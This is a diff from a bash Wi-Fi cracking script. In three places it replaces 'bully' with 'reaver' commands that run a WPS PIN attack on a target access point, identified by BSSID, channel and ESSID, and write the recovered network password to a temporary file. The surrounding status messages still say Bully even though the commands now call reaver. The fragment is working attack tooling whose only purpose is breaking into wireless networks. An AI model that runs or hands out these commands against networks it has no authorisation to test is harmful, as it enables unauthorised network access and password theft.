@@ -1645,7 +1645,7 @@ CRACKING_PROCESS() {
 										                             echo ""
 										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN -e "$ESSID" $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt 2> /dev/null &
 										                             PID="$!"
 										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
 										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
@@ -2486,7 +2486,7 @@ case $menu in
 										                             echo ""
 										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > ${Temporary}/Get_Pass.txt 2> /dev/null &
 										                             PID="$!"
 										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
 										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
@@ -2547,7 +2547,7 @@ case $menu in
 									echo ""
 									echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
 									echo ""
-									bully -b $BSSID -c $CHANNEL -B -F -e "$ESSID" -p $PIN $mon
+									reaver -i $mon -b $BSSID -c $CHANNEL -vv -e "$ESSID" -p $PIN
 									echo -e "$Yellow [+]$Green Congratulation (^_^) "
 									echo ""
 								else
